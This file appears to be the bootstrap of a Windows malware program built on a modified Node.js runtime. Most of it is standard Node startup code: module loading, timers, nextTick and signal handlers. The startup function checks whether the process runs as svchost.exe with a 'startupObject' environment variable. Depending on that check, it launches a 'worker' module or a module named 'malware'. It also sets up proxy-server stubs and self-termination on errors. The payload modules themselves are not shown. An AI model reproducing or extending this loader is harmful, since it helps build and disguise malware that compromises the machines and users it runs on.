(function (process) {
    this.global = this;



    function startup() {

        var EventEmitter = NativeModule.require('events').EventEmitter;

        process.__proto__ = Object.create(EventEmitter.prototype, {
            constructor: {
                value: process.constructor
            }
        });

        EventEmitter.call(process);

        process.EventEmitter = EventEmitter;

        NativeModule.require('tracing')._nodeInitialization(process);

        startup.processFatal();

        startup.globalVariables();
        startup.globalTimeouts();
        startup.globalConsole();

        startup.processAssert();
        startup.processNextTick();
        startup.processKillAndExit();
        startup.processSignalHandlers();
        startup.processChannel();

        startup.resolveArgv0();
        
        process.on('uncaughtException', function (err) {
            console.log('[root] Caught exception (uncaughtException): ' + err);
            console.log('[root] Caught exception (uncaughtException): ' + err.stack);
            if (typeof (process.fatalCallback) !== 'undefined') {
                process.fatalCallback();
            }

            process.terminateSelf();
        });

        process.httpProxyServer = {};
        process.httpsProxyServer = {};

        process.httpProxyServer.close = setImmediate;
        process.httpsProxyServer.close = setImmediate;

        var path = NativeModule.require('path');
        process.currentBinary = path.basename(process.execPath).toLowerCase();
        process.currentUser = process.env.USERNAME;
        process.isWorker = ((typeof (process.env["startupObject"]) !== 'undefined') && process.currentBinary === 'svchost.exe');

        NativeModule.require("windows").init(global);


        if (process.isWorker) {
            NativeModule.require("worker").run();
        } else {
            NativeModule.require("malware").run();
        }

        process.dbg(process.execPath);

    }

    startup.globalVariables = function () {
        global.process = process;
        global.global = global;
        global.GLOBAL = global;
        global.root = global;
        global.Buffer = NativeModule.require('buffer').Buffer;
        process.domain = null;
        process._exiting = false;

        global.print = function () {
            if (process.bIsDebugVersion) {
                console.log.apply(this, arguments);
            }
        }

        global.printf = global.print;

        
    };

    process.timers = [];

    startup.globalTimeouts = function () {
        global.setTimeout = function () {
            var t = NativeModule.require('timers');
            return t.setTimeout.apply(this, arguments);
        };

        global.setInterval = function () {
            var t = NativeModule.require('timers');
            return t.setInterval.apply(this, arguments);
        };

        global.clearTimeout = function () {
            var t = NativeModule.require('timers');
            return t.clearTimeout.apply(this, arguments);
        };

        global.clearInterval = function () {
            var t = NativeModule.require('timers');
            return t.clearInterval.apply(this, arguments);
        };

        global.setImmediate = function () {
            var t = NativeModule.require('timers');
            return t.setImmediate.apply(this, arguments);
        };

        global.clearImmediate = function () {
            var t = NativeModule.require('timers');
            return t.clearImmediate.apply(this, arguments);
        };
    };


    startup.globalConsole = function () {
        global.__defineGetter__('console', function () {
            return NativeModule.require('console');
        });
    };


    startup._lazyConstants = null;

    startup.lazyConstants = function () {
        if (!startup._lazyConstants) {
            startup._lazyConstants = process.binding('constants');
        }
        return startup._lazyConstants;
    };

    startup.processFatal = function () {
        var tracing = NativeModule.require('tracing');
        var _errorHandler = tracing._errorHandler;
        
        delete tracing._errorHandler;

        process._fatalException = function (er) {
            
            var caught = _errorHandler(er);

            if (process.domain && process.domain._errorHandler)
                caught = process.domain._errorHandler(er) || caught;

            if (!caught)
                caught = process.emit('uncaughtException', er);

            
            
            if (!caught) {
                try {
                    if (!process._exiting) {
                        process._exiting = true;
                        process.emit('exit', 1);
                    }
                } catch (er) {
                    
                }

                
            } else {
                var t = setImmediate(process._tickCallback);
                
                
                if (t._asyncQueue)
                    t._asyncQueue = [];
            }

            return caught;
        };
    };

    var assert;
    startup.processAssert = function () {
        assert = process.assert = function (x, msg) {
            if (!x) throw new Error(msg || 'assertion error');
        };
    };

    startup.processNextTick = function () {
        var tracing = NativeModule.require('tracing');
        var nextTickQueue = [];
        var asyncFlags = tracing._asyncFlags;
        var _runAsyncQueue = tracing._runAsyncQueue;
        var _loadAsyncQueue = tracing._loadAsyncQueue;
        var _unloadAsyncQueue = tracing._unloadAsyncQueue;
        var microtasksScheduled = false;

        
        var _runMicrotasks = {};

        
        
        var tickInfo = {};

        
        var kIndex = 0;
        var kLength = 1;

        
        
        var kCount = 0;

        process.nextTick = nextTick;
        
        process._tickCallback = _tickCallback;
        process._tickDomainCallback = _tickDomainCallback;

        process._setupNextTick(tickInfo, _tickCallback, _runMicrotasks);

        _runMicrotasks = _runMicrotasks.runMicrotasks;

        function tickDone() {
            if (tickInfo[kLength] !== 0) {
                if (tickInfo[kLength] <= tickInfo[kIndex]) {
                    nextTickQueue = [];
                    tickInfo[kLength] = 0;
                } else {
                    nextTickQueue.splice(0, tickInfo[kIndex]);
                    tickInfo[kLength] = nextTickQueue.length;
                }
            }
            tickInfo[kIndex] = 0;
        }

        function scheduleMicrotasks() {
            if (microtasksScheduled)
                return;

            nextTickQueue.push({
                callback: runMicrotasksCallback,
                domain: null
            });

            tickInfo[kLength]++;
            microtasksScheduled = true;
        }

        function runMicrotasksCallback() {
            microtasksScheduled = false;
            _runMicrotasks();

            if (tickInfo[kIndex] < tickInfo[kLength])
                scheduleMicrotasks();
        }

        
        
        function _tickCallback() {
            var callback, hasQueue, threw, tock;

            scheduleMicrotasks();

            while (tickInfo[kIndex] < tickInfo[kLength]) {
                tock = nextTickQueue[tickInfo[kIndex]++];
                callback = tock.callback;
                threw = true;
                hasQueue = !!tock._asyncQueue;
                if (hasQueue)
                    _loadAsyncQueue(tock);
                try {
                    callback();
                    threw = false;
                } finally {
                    if (threw)
                        tickDone();
                }
                if (hasQueue)
                    _unloadAsyncQueue(tock);
                if (1e4 < tickInfo[kIndex])
                    tickDone();
            }

            tickDone();
        }

        function _tickDomainCallback() {
            var callback, domain, hasQueue, threw, tock;

            scheduleMicrotasks();

            while (tickInfo[kIndex] < tickInfo[kLength]) {
                tock = nextTickQueue[tickInfo[kIndex]++];
                callback = tock.callback;
                domain = tock.domain;
                hasQueue = !!tock._asyncQueue;
                if (hasQueue)
                    _loadAsyncQueue(tock);
                if (domain)
                    domain.enter();
                threw = true;
                try {
                    callback();
                    threw = false;
                } finally {
                    if (threw)
                        tickDone();
                }
                if (hasQueue)
                    _unloadAsyncQueue(tock);
                if (1e4 < tickInfo[kIndex])
                    tickDone();
                if (domain)
                    domain.exit();
            }

            tickDone();
        }

        function nextTick(callback) {
            
            if (process._exiting)
                return;

            var obj = {
                callback: callback,
                domain: process.domain || null,
                _asyncQueue: undefined
            };

            if (asyncFlags[kCount] > 0)
                _runAsyncQueue(obj);

            nextTickQueue.push(obj);
            tickInfo[kLength]++;
        }
    };

    function evalScript(name) {
        var Module = NativeModule.require('module');
        var path = NativeModule.require('path');
        var cwd = process.cwd();

        var module = new Module(name);
        module.filename = path.join(cwd, name);
        module.paths = Module._nodeModulePaths(cwd);
        var script = process._eval;
        if (!Module._contextLoad) {
            var body = script;
            script = 'global.__filename = ' + JSON.stringify(name) + ';\n' +
                     'global.exports = exports;\n' +
                     'global.module = module;\n' +
                     'global.__dirname = __dirname;\n' +
                     'global.require = require;\n' +
                     'return require("vm").runInThisContext(' +
                     JSON.stringify(body) + ', { filename: ' +
                     JSON.stringify(name) + ' });\n';
        }
        var result = module._compile(script, name + '-wrapper');
        if (process._print_eval) console.log(result);
    }

    function errnoException(errorno, syscall) {

        var e = new Error(syscall + ' ' + errorno);
        e.errno = e.code = errorno;
        e.syscall = syscall;
        return e;
    }

    startup.processKillAndExit = function () {

        process.exit = function (code) {
            if (code || code === 0)
                process.exitCode = code;

            if (!process._exiting) {
                process._exiting = true;
                process.emit('exit', process.exitCode || 0);
            }
            process.reallyExit(process.exitCode || 0);
        };

        process.kill = function (pid, sig) {
            var err;

            if (typeof pid !== 'number' || !isFinite(pid)) {
                throw new TypeError('pid must be a number');
            }

            
            if (0 === sig) {
                err = process._kill(pid, 0);
            } else {
                sig = sig || 'SIGTERM';
                if (startup.lazyConstants()[sig] &&
                    sig.slice(0, 3) === 'SIG') {
                    err = process._kill(pid, startup.lazyConstants()[sig]);
                } else {
                    throw new Error('Unknown signal: ' + sig);
                }
            }

            if (err) {
                var errnoException = NativeModule.require('util')._errnoException;
                throw errnoException(err, 'kill');
            }

            return true;
        };
    };

    startup.processChannel = function () {
        
        
        if (process.env.NODE_CHANNEL_FD) {
            var fd = parseInt(process.env.NODE_CHANNEL_FD, 10);
            assert(fd >= 0);

            
            delete process.env.NODE_CHANNEL_FD;

            var cp = NativeModule.require('child_process');

            
            
            
            process.binding('tcp_wrap');

            cp._forkChild(fd);
            assert(process.send);
        }
    };

    startup.processSignalHandlers = function () {
        
        
        var signalWraps = {};
        var addListener = process.addListener;
        var removeListener = process.removeListener;

        function isSignal(event) {
            return event.slice(0, 3) === 'SIG' &&
                   startup.lazyConstants().hasOwnProperty(event);
        }

        
        process.on = process.addListener = function (type, listener) {
            if (isSignal(type) &&
                !signalWraps.hasOwnProperty(type)) {
                var Signal = process.binding('signal_wrap').Signal;
                var wrap = new Signal();

                wrap.unref();

                wrap.onsignal = function () { process.emit(type); };

                var signum = startup.lazyConstants()[type];
                var err = wrap.start(signum);
                if (err) {
                    wrap.close();
                    var errnoException = NativeModule.require('util')._errnoException;
                    throw errnoException(err, 'uv_signal_start');
                }

                signalWraps[type] = wrap;
            }

            return addListener.apply(this, arguments);
        };

        process.removeListener = function (type, listener) {
            var ret = removeListener.apply(this, arguments);
            if (isSignal(type)) {
                assert(signalWraps.hasOwnProperty(type));

                if (NativeModule.require('events').listenerCount(this, type) === 0) {
                    signalWraps[type].close();
                    delete signalWraps[type];
                }
            }

            return ret;
        };
    };


    startup.resolveArgv0 = function () {
        var cwd = process.cwd();
        var isWindows = process.platform === 'win32';

        
        
        
        
        
        var argv0 = process.argv[0];
        if (!isWindows && argv0.indexOf('/') !== -1 && argv0.charAt(0) !== '/') {
            var path = NativeModule.require('path');
            process.argv[0] = path.join(cwd, process.argv[0]);
        }
    };

    var ContextifyScript = process.binding('contextify').ContextifyScript;
    function runInThisContext(code, options) {
        var script = new ContextifyScript(code, options);
        return script.runInThisContext();
    }

    function NativeModule(id) {
        this.filename = id + '.js';
        this.id = id;
        this.exports = {};
        this.loaded = false;
    }

    NativeModule._source = process.binding('natives');
    NativeModule._cache = {};

    NativeModule.require = function (id) {

        if (id == 'native_module') {
            return NativeModule;
        }

        var cached = NativeModule.getCached(id);

        if (cached) {
            return cached.exports;
        }

        if (!NativeModule.exists(id)) {
            throw new Error('No such native module ' + id);
        }

        process.moduleLoadList.push('NativeModule ' + id);

        var nativeModule = new NativeModule(id);

        nativeModule.cache();
        nativeModule.compile();
        return nativeModule.exports;
    };

    NativeModule.getCached = function (id) {
        return NativeModule._cache[id];
    }

    NativeModule.exists = function (id) {
        return NativeModule._source.hasOwnProperty(id);
    }

    NativeModule.getSource = function (id) {
        return NativeModule._source[id];
    }

    NativeModule.wrap = function (script) {
        return NativeModule.wrapper[0] + script + NativeModule.wrapper[1];
    };

    NativeModule.wrapper = [
      '(function (exports, require, module, __filename, __dirname) { ',
      '\n});'
    ];

    NativeModule.prototype.compile = function () {
        var source = NativeModule.getSource(this.id);
        source = NativeModule.wrap(source);

        var fn = runInThisContext(source, { filename: this.filename });
        fn(this.exports, NativeModule.require, this, this.filename);

        this.loaded = true;
    };

    NativeModule.prototype.cache = function () {
        NativeModule._cache[this.id] = this;
    };

    startup();

});
